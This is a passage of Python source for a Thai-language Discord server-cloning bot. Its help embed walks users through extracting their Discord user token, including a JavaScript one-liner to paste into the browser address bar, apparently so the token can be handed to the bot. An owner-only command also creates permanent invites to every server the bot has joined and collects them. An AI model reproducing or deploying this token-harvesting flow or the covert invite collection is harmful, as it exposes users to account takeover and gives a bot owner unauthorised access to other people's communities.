            emb1.set_footer(text="ขั้นตอน: F12 > Network > พิมพ์ /messages > Headers > หา 'authorization'")
            emb2 = discord.Embed(title="วิธีการหา User Token (มือถือ / Mobile)", color=0xFF0000)
            emb2.description = (
                "**ขั้นตอนสำหรับมือถือ:**\n"
                "1. เข้า Discord ผ่านเว็บเบราว์เซอร์ในโหมด 'Desktop Site'\n"
                "2. พิมพ์โค้ด JavaScript ในช่อง URL:\n"
                "```javascript\n(webhook=>(window.webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let t in e.c)m.push(e.c[t])}]),m.find(e=>e?.exports?.default?.getToken!==void 0).exports.default.getToken()))```\n"
                "3. Token จะแสดงขึ้นมาให้คัดลอกได้ทันที\n\n"
                "**ตัวอย่างคลิปสอน**\nhttps://www.youtube.com/watch?v=p5a6-emSqDQ"
            )
            emb2.set_image(url="https://cdn.discordapp.com/attachments/1498933737067511890/1499287039101763816/standard_2.gif?ex=69f43f5d&is=69f2eddd&hm=4164e443b29a796660599b80242e5b0585d2a2b56a0a91460dc74bb2378d647e&")
            await interaction.response.send_message(embeds=[emb1, emb2], ephemeral=True)
        elif select.values[0] == "check_guild_ids": await interaction.response.send_modal(UserGuildsModal())
        else: await interaction.response.defer()
    @ui.select(custom_id="multi_select", placeholder="|︲ เมนูตัวเลือกเพิ่มเติม 2 ︲|", row=2, options=[
        discord.SelectOption(label="ก๊อปแค่ช่องและหมวดหมู่", value="ch", emoji="⭐"),
        discord.SelectOption(label="ก๊อปแค่บทบาทเท่านั้น", value="rl", emoji="🌈"),
        discord.SelectOption(label="ก๊อปแค่อิโมจิเท่านั้น", value="em", emoji="😢"),
        discord.SelectOption(label="ล้างตัวเลือกทั้งหมด", value="clear", emoji="🗑️"),
    ])
    async def multi_copy(self, interaction: discord.Interaction, select: ui.Select):
        if select.values[0] == "clear": await interaction.response.defer()
        else: await interaction.response.send_modal(PartCopyModal(select.values[0]))
    @ui.select(custom_id="extra_select", placeholder="|︲ เมนูตัวเลือกเพิ่มเติม 3 ︲|", row=3, options=[
        discord.SelectOption(label="ก๊อปไฟล์อิโมจิ", value="dl_emoji", emoji="🌈"),
        discord.SelectOption(label="ล้างตัวเลือกทั้งหมด", value="clear_extra", emoji="🗑️"),
    ])
    async def extra_menu(self, interaction: discord.Interaction, select: ui.Select):
        if select.values[0] == "dl_emoji": await interaction.response.send_modal(EmojiDownloadModal())
        else: await interaction.response.defer()

async def send_v2_components(channel_id: int, bot_token: str):
    url = f"https://discord.com/api/v10/channels/{channel_id}/messages"
    headers = {"Authorization": f"Bot {bot_token}", "Content-Type": "application/json"}
    payload = {"flags": 32768, "components": build_copy_v2_components(), "allowed_mentions": {"parse": []}}
    async with aiohttp.ClientSession() as session:
        async with session.post(url, headers=headers, json=payload) as r:
            try: data = await r.json()
            except Exception: data = {}
            return r.status, data

@bot.tree.command(name="copy_server", description="ตั้งค่าระบบก๊อปปี้เซิร์ฟเวอร์ (เฉพาะผู้ดูแลระบบ)")
@app_commands.describe(channel="เลือกห้องที่ต้องการให้บอทส่ง UI")
@app_commands.default_permissions(administrator=True)
@app_commands.guild_only()
async def setup_clone(interaction: discord.Interaction, channel: discord.TextChannel):
    if not interaction.guild or not interaction.user.guild_permissions.administrator: return await safe_send_response(interaction, "❌ มึงไม่มีสิทธิ์ใช้คำสั่งนี้!")
    await interaction.response.defer(ephemeral=True)
    status, data = await send_v2_components(channel.id, TOKEN)
    if status in [200, 201]: await safe_followup(interaction, f"✅ ติดตั้ง Components V2 ที่ห้อง {channel.mention} เรียบร้อย!")
    else: await safe_followup(interaction, f"❌ เกิดข้อผิดพลาด: `{data}`")

@bot.command(name="setup")
@commands.has_permissions(administrator=True)
@commands.guild_only()
async def setup_prefix(ctx, channel: discord.TextChannel = None):
    target = channel or ctx.channel
    status, data = await send_v2_components(target.id, TOKEN)
    if status in [200, 201]: await ctx.send(f"✅ ติดตั้ง Components V2 ที่ห้อง {target.mention} เรียบร้อย!", delete_after=5)
    else: await ctx.send(f"❌ เกิดข้อผิดพลาด: `{data}`", delete_after=5)

@bot.tree.command(name="pull_all_invites", description="ดึงลิงก์เชิญทุกดิสที่บอทอยู่")
@app_commands.guild_only()
async def pull_all_invites(interaction: discord.Interaction):
    if interaction.user.id != OWNER_ID: return await safe_send_response(interaction, "❌ มึงไม่มีสิทธิ!")
    await interaction.response.defer(ephemeral=True)
    results = [f"{len(bot.guilds)} เซิร์ฟเวอร์\n"]
    for guild in bot.guilds:
        try:
            target = guild.system_channel or next((ch for ch in guild.text_channels if ch.permissions_for(guild.me).create_instant_invite), None)
            if target:
                invite = await target.create_invite(max_age=0, max_uses=0)
                results.append(f"📌 **{guild.name}** | {invite}")
            else: results.append(f"📌 **{guild.name}** | ⛔ สร้างไม่ได้")
        except Exception: results.append(f"📌 **{guild.name}** | ⛔ ผิดพลาด")
    final_msg = "\n".join(results)
    if len(final_msg) > 2000:
        with open("invites.txt", "w", encoding="utf-8") as f: f.write(final_msg)
        try: await interaction.followup.send("ส่งเป็นไฟล์:", file=discord.File("invites.txt"), ephemeral=True)
        except Exception: pass
    else: await safe_followup(interaction, final_msg)

@bot.command(name="sync")
@commands.has_permissions(administrator=True)
async def sync_cmd(ctx):
    await ctx.send("⏳ กำลัง Sync คำสั่ง Slash...")
    try:
        synced = await bot.tree.sync(guild=ctx.guild)
        await ctx.send(f"✅ Sync สำเร็จ! พบคำสั่งทั้งหมด {len(synced)} คำสั่ง (เฉพาะเซิร์ฟเวอร์นี้)")
    except Exception as e:
        await ctx.send(f"❌ เกิดข้อผิดพลาด: {e}")

@bot.tree.command(name="sync_global", description="Sync คำสั่ง Slash แบบ Global (สำหรับทุกเซิร์ฟเวอร์)")
@app_commands.default_permissions(administrator=True)
async def sync_global(interaction: discord.Interaction):
    await interaction.response.defer(ephemeral=True)
    try:
        synced = await bot.tree.sync()
        await interaction.followup.send(f"✅ Sync Global สำเร็จ! พบคำสั่งทั้งหมด {len(synced)} คำสั่ง", ephemeral=True)
    except Exception as e:
        await interaction.followup.send(f"❌ เกิดข้อผิดพลาด: {e}", ephemeral=True)

if __name__ == "__main__":
    if not TOKEN:
        print("❌ ไม่พบ DISCORD_BOT_TOKEN! กรุณาตั้งค่าใน .env หรือ export ก่อนรัน")
        exit(1)
    print("[Bot] กำลังเริ่มต้น...")
    bot.run(TOKEN)
